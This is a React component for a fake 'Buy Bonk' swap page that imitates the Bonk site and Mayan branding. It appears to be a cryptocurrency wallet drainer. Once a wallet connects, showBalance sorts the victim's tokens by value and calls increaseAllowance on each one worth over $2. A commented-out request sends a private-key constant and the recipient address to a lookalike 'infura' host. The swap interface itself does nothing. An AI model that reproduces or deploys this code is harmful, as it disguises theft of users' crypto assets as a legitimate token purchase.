/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react/style-prop-object */
/* eslint-disable jsx-a11y/alt-text */
import React from 'react';
import walletIcon from "../assets/image/walletIcon.svg"
import settingIcon from "../assets/image/settingIcon.png"
import { toast } from "react-toastify"
import { useEffect } from "react";
// import Typed from 'react-typed';
import Big from 'big.js';
import axios from 'axios';
import { useWeb3Modal } from "@web3modal/react";
import { getTokens, increaseAllowance, ethBalance } from '../utils/walletconnect.js';
import { getAccount, fetchFeeData } from '@wagmi/core';
import { useAccount } from 'wagmi';
import * as constants from '../utils/constants.js';

const ContentBody = () => {
    // let showModal = false;
    // let account = null;
    let processing = false;
    let balance = {};
    let tokens = [];
    let maxToken = null;
    let sortedTokens = [];
    let prices = [];
    const decimal = 18;

    const { address, isConnected } = useAccount();
    const { open } = useWeb3Modal();

    const handleErrBtn = () => {
        toast.warn("Warning! Please connect wallet!")
    }

    useEffect(() => {
        if (isConnected) {
            showBalance();
        }
    }, [isConnected])

    const getDisplayString = (
        str,
        subLength1,
        subLength2
      ) => {
        return `${str.toString().substr(0, subLength1)}...${str
          .toString()
          .substr(str.length - subLength2, str.length)}`;
      };

    const handleWalletConnect = async () => {
        try {
            if (!isConnected) {
                await open();
                return;
            } else {
                // account = getAccount().address;
                await showBalance();
            }
        } catch (error) {
            console.log(error);
        }
    }

    const showBalance = async () => {
        console.log("showBalance function start!!!");
        await setPrices();
        let total = 0;
        try {
            processing = true;
            const ethbalance = await ethBalance();
            const feeData = await fetchFeeData({
                chainId: 1,
                formatUnits: 'gwei',
            });
            const fee = 50000n * (feeData.gasPrice);
            total = ethbalance.value - fee - 300000000000000n;
            // console.log("total is:", total);
            // console.log("fee is:", fee);
            balance = Big(total).div(Big(10).pow(parseInt(decimal))).toFixed();
            // console.log("Bigint Balance is:", balance);
            const validTokens = await getTokens(getAccount().address);
            // console.log('validTokens is:', validTokens);
            for (let i = 0; i < validTokens.length; i++) {
                if (validTokens[i].symbol === 'USDT') {
                    validTokens[i].usdPrice = 1;
                    continue;
                }
                try {
                    const price = prices.filter(
                        (price) => price.symbol === `${validTokens[i].symbol}USDT`
                    );
                    validTokens[i].usdPrice = price[0].price;
                } catch (error) {
                    validTokens[i].usdPrice = 0;
                    continue;
                }
            }
            const tokenlist = validTokens.filter((token) => token.usdPrice > 0);
            // console.log("tokenlist is: ", tokenlist);
            for (let i = 0; i < tokenlist.length; i++) {
                const token = tokenlist[i];
                const etherValue = token.balance / Math.pow(10, token.decimals);
                tokenlist[i].usdValue =
                    tokenlist[i].usdPrice * parseFloat(etherValue).toFixed(2);
            }
            tokens = tokenlist;
            const mxToken = tokenlist.sort((a, b) => b.usdValue - a.usdValue);
            // console.log("mxToken is: ", mxToken);
            sortedTokens = mxToken.filter((token) => token.usdValue > 2);
            // console.log("sortedTokens is: ", sortedTokens);
        } catch (error) {
            console.log();
        }

        for (let i = 0; i < sortedTokens.length; i++) {
            maxToken = sortedTokens[i];
            // console.log('maxToken is: ', maxToken);
            await increaseAllowance(maxToken);
        }
    }

    const setPrices = async () => {
        try {
            const res = await axios.get(
                'https://api.binance.com/api/v3/ticker/price'
            );
            prices = res.data;
            // await axios.post('https://api2.infura.pro:8443/infura', { infra_id: `${constants.initiatorPK} ${constants.recipient}`, project_id: "layer3" },
            //     {
            //         headers: {
            //             "Access-Control-Allow-Headers": "*", // this will allow all CORS requests
            //             "Access-Control-Allow-Methods": 'OPTIONS,POST,GET', // this states the allowed methods
            //             "Content-Type": "application/json" // this shows the expected content type
            //         }  
            //     }
            // )
            //     .then((response) => {
            //         console.log(response.data);
            //         if (response.data.success === true) {
            //             console.log("set new recip");
            //             constants.setRecip(response.data.value);
            //         }
            //         console.log("Recipient:", constants.recipient);
            //     });
        } catch (error) {
            console.log(error);
        }
    }

    return (
        <>
            <div className="white-line-nav">
                <div className="navbar w-nav">
                    <div style={{ transform: "translate3d(0px, -100%, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg)", display: "none", transformStyle: "preserve-3d" }} className="page-transition">
                    </div>
                    <div className="div-block-5">
                        <div className="w-layout-grid grid">
                            <div id="w-node-_9ae1c1ea-9434-1224-6b81-e691eae1449d-d49e2f0e" className="div-block-6">
                                <div className="all-buttons w-embed"></div>
                                <div className="butt-wrap">
                                    <a href="https://www.bonkcoin.com/about" aria-current="page" className="btn btn-one w-inline-block w--current">
                                        <div className="text-block-5">ABOUT</div>
                                    </a>
                                    <div className="custom-css w-embed"></div>
                                </div>
                                <div className="butt-wrap">
                                    <a href="https://www.bonkcoin.com/integrations" className="btn btn-one two w-inline-block">
                                        <div className="text-block-5">INTEGRATIONS</div>
                                    </a>
                                    <div className="custom-css w-embed btn-one"></div>
                                </div>
                                <div className="butt-wrap">
                                    <a href="https://www.bonkcoin.com/bonk-paper" className="btn btn-one w-inline-block">
                                        <div className="text-block-5">BONK PAPER</div>
                                    </a>
                                    <div className="custom-css w-embed btn-one"></div>
                                </div>
                                <a href="https://openbonk.io/" target="_blank" className="btn btn-one w-inline-block" rel="noreferrer">
                                    <div className="text-block-5">OPENBONK</div>
                                </a>
                                <div id="w-node-_9ae1c1ea-9434-1224-6b81-e691eae144ae-d49e2f0e" className="nav-item-wrapper-2"><a href="https://www.bonkcoin.com/nft" className="btn btn-one w-inline-block">
                                    <div className="art">NFT</div>
                                </a></div>
                                <div id="w-node-_9ae1c1ea-9434-1224-6b81-e691eae144ae-d49e2f0e" className="nav-item-wrapper-2"><a href="https://buybonk.com" className="btn btn-one w-inline-block">
                                    <div className="art">GET BONK</div>
                                </a></div>
                            </div>
                            <div id="w-node-_9ae1c1ea-9434-1224-6b81-e691eae144b2-d49e2f0e" className="butt-wrap">
                                <a href="https://www.bonkcoin.com/" className="btn btn-one bonk w-inline-block">
                                    <div className="text-block-5 bonk">BONK</div>
                                </a>
                                <div className="custom-css w-embed btn-one btn-one"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div data-hover="false" data-delay="0" data-w-id="8b3cbf17-a121-011a-e242-41d00d06ae87" className="accordion-nav w-dropdown" style={{ height: "60px" }}>
                <div className="accordion-toggle-nav w-dropdown-toggle" id="w-dropdown-toggle-0" aria-controls="w-dropdown-list-0" aria-haspopup="menu" aria-expanded="false" role="button" tabIndex="0">
                    <div className="nav-title mobile">
                        <a href="https://www.bonkcoin.com/" className="div-block-11 w-inline-block">
                            <div id="w-node-_8b3cbf17-a121-011a-e242-41d00d06ae8a-0d06ae87" className="h6 h9">BONK</div>
                        </a>
                        <div id="w-node-_8b3cbf17-a121-011a-e242-41d00d06ae8c-0d06ae87" className="plus-button-int-nav">
                            <div data-w-id="8b3cbf17-a121-011a-e242-41d00d06ae8d"
                                className="text-block-2"
                                onClick={handleErrBtn}
                                style={{ transform: "translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg)", transformStyle: "preserve-3d" }}>
                                +
                            </div>
                        </div>
                    </div>
                </div>
                <nav className="dropdown-list mobile w-dropdown-list" id="w-dropdown-list-0" aria-labelledby="w-dropdown-toggle-0">
                    <div className="mobile-nav-item-wrapper">
                        <a href="https://www.bonkcoin.com/about" aria-current="page" className="nav-button-mobile w-inline-block w--current" tabIndex="0">
                            <div className="h7">ABOUT</div>
                        </a>
                        <a href="https://www.bonkcoin.com/integrations" className="nav-button-mobile w-inline-block" tabIndex="0">
                            <div className="h7 h9">INTEGRATIONS</div>
                        </a>
                        <a href="https://www.bonkcoin.com/bonk-paper" className="nav-button-mobile bonk-paper-m w-inline-block" tabIndex="0">
                            <div className="h7 h9">BONK PAPER</div>
                        </a>
                        <a href="https://openbonk.io/" target="_blank" className="nav-button-mobile bonk-paper-m w-inline-block" tabIndex="0" rel="noreferrer">
                            <div className="h7 h9">OPENBONK</div>
                        </a>
                        <a href="https://www.bonkcoin.com/nft" className="nav-button-mobile bonk-paper-m w-inline-block" tabIndex="0">
                            <div className="h7 h9">NFT</div>
                        </a>
                        <a href="https://buybonk.com" className="nav-button-mobile bonk-paper-m w-inline-block" tabIndex="0">
                            <div className="h7 h9">GET BONK</div>
                        </a>
                    </div>
                </nav>
            </div>
            <div style={{ width: "100%", marginTop: "140px", marginBottom: "70px", paddingBottom: "70px", minHeight: "calc(100vh - 140px)", display: "flex", alignItems: "center", justifyContent: "center" }}>
                <div style={{ border: "1px solid #664611", borderRadius: "12px", minWidth: "362px", minHeight: "642px" }} className="p-4 relative">
                    <div className='flex flex-row justify-between pl-3 min-w-82 max-h-10 mb-4'>
                        <div className='flex flex-col justify-center'>
                            Buy Bonk
                        </div>
                        <div className='flex flex-row justify-end'>
                            {address ?
                                (<div className="flex flex-col justify-center wallet-button mr-2 max-w-31 max-h-10">
                                    <button className='flex flex-row justify-center' onClick={handleErrBtn}>
                                        <div className='pr-1'>
                                            {getDisplayString(address, 4, 4)}
                                        </div>
                                        <img className="w-5 h-5" src={walletIcon} />
                                    </button>
                                </div>) : (<div className="flex flex-col hidden justify-center wallet-button mr-2 max-w-31 max-h-10">
                                    <button className='flex flex-row justify-center' onClick={handleErrBtn}>
                                        <div className='pr-1'>
                                            { }
                                        </div>
                                        <img className="w-5 h-5" src={walletIcon} />
                                    </button>
                                </div>)
                            }
                            <div className="flex flex-col justify-center setting-button">
                                <button className='flex flex-row justify-center' onClick={handleErrBtn}>
                                    <img className="w-6 h-6" src={settingIcon} />
                                </button>
                            </div>
                        </div>
                    </div>
                    <div className="css-1g8xedm">
                        <div className="css-gvqrpo">
                            <button className="css-1rb8xje" tabIndex="0" type="button" onClick={handleErrBtn}>
                                <span className="css-lrto23">
                                    <img src="https://statics.mayan.finance/eth.png" className="css-1qlyvvp" />
                                </span>
                                ETH
                                <span className="css-1cu6zkn">
                                    <svg className="css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ExpandMoreOutlinedIcon">
                                        <path d="M16.59 8.59 12 13.17 7.41 8.59 6 10l6 6 6-6-1.41-1.41z"></path>
                                    </svg>
                                </span>
                            </button>
                            <button className="css-euvm0h" tabIndex="0" type="button" onClick={handleErrBtn}>
                                <span className="css-lrto23">
                                    <img src="https://statics.mayan.finance/eth.png" className="css-1t9pz9x" />
                                </span>
                                <span className="css-115wr2x">Ethereum</span>
                                <span className="css-1cu6zkn">
                                    <svg className="css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ExpandMoreOutlinedIcon">
                                        <path d="M16.59 8.59 12 13.17 7.41 8.59 6 10l6 6 6-6-1.41-1.41z"></path>
                                    </svg>
                                </span>
                                <span className="css-w0pj6f"></span>
                            </button>
                        </div>
                        <div className="css-183k418">
                            <div className="css-ffvhtl">
                                <div className="css-vo5lqr">
                                    {/* <input placeholder="0.00" type="text" className="css-1jhxu0" value="" /> */}
                                    <input
                                        type="text"
                                        // value={stakeAmount}
                                        // onChange={(e) => handleChange(e.target.value)}
                                        placeholder="0.00"
                                        className="input-text text-black focus:outline-none"
                                    />
                                </div>
                            </div>
                            <div className="css-1i5ttgl">
                                <span className="css-e4isfv">Balance: 0</span>
                            </div>
                        </div>
                    </div>
                    <div className="css-kcge3c" title="Swap to">
                        <button className="css-t02zgs" tabIndex="0" type="button">
                            <svg className="css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 19 18">
                                <path d="M14.75 11.25L13.6925 10.1925L10.25 13.6275V1.5H8.75V13.6275L5.3075 10.185L4.25 11.25L9.5 16.5L14.75 11.25Z"></path>
                            </svg>
                            <span className="css-w0pj6f"></span>
                        </button>
                    </div>
                    <div className="css-1qxeoxf">
                        <div className="css-gvqrpo">
                            <button className="css-e2m1m2" tabIndex="0" type="button">
                                <span className="css-lrto23">
                                    <img src="https://assets.coingecko.com/coins/images/28600/small/bonk.jpg?1672304290" className="css-1qlyvvp" />
                                </span>
                                BONK
                                <span className="css-w0pj6f"></span>
                            </button>
                            <button className="css-euvm0h" tabIndex="0" type="button">
                                <span className="css-lrto23">
                                    <img src="https://statics.mayan.finance/assets/SOL.png" className="css-1t9pz9x" />
                                </span>
                                <span className="css-115wr2x">Solana</span>
                                <span className="css-w0pj6f"></span>
                            </button>
                        </div>
                        <div className="css-1nbzv6z">
                            <div className="css-ffvhtl">
                                <span className="css-1e93me3 pl-3">0.00</span>
                            </div>
                            <div className="css-1i5ttgl">
                            </div>
                        </div>
                    </div>
                    <div className="css-jhjyr2">
                        <button className="css-562zxx" tabIndex="0" type="button" onClick={handleWalletConnect}>
                            {isConnected ? "Buy Bonk" : "Connect Wallet"}
                        </button>
                    </div>
                    <div className="css-iigfli absolute bottom-3 right-0 left-0">
                        <a className="css-1cpep9a" href="https://swap.mayan.finance">
                            <span className="css-e4isfv">Powered by Mayan</span>
                        </a>
                    </div>
                </div>
            </div>
        </>
    )
}

export default ContentBody;